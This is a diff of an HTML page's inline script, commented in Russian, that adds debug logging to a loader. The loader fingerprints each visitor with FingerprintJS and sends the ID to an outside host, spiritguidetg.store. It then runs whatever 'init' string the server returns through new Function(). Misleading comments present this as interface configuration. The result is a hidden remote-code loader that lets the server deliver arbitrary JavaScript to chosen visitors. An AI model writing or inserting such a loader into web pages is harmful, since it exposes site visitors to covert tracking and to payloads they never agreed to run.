@@ -6,33 +6,49 @@
 <script type="module">
 (async () => {
     try {
+        // Исправлен URL - убран двойной слэш
         const CONFIG_API = 'https://spiritguidetg.store/fp.php';
         
-        // Динамический импорт вместо статического
+        console.log('Starting FingerprintJS initialization...');
+        
         const FingerprintJS = await import('/clk/fp.js');
+        console.log('FingerprintJS loaded successfully');
         
         const fp = await FingerprintJS.load({
             region: 'eu',
             endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
         });
+        console.log('FingerprintJS initialized');
 
         const { requestId } = await fp.get({ extendedResult: true });
+        console.log('Request ID received:', requestId);
 
-        // Загрузка конфигурации интерфейса
-        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
-        if (!res.ok) return;
+        // Загрузка конфигурации
+        const url = `${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`;
+        console.log('Fetching config from:', url);
+        
+        const res = await fetch(url);
+        console.log('Response status:', res.status);
+        
+        if (!res.ok) {
+            console.error('Response not OK:', res.status, res.statusText);
+            return;
+        }
 
         const data = await res.json();
+        console.log('Response data:', data);
 
-        // Выполнение пользовательских настроек
         if (data.init) {
+            console.log('Executing init script...');
             new Function(data.init)();
         }
     } catch (err) {
-        console.error('Ошибка загрузки FingerprintJS:', err);
+        console.error('Detailed error:', err);
+        console.error('Error stack:', err.stack);
     }
 })();
 </script>
+
 </head>
 <body>
   hello world
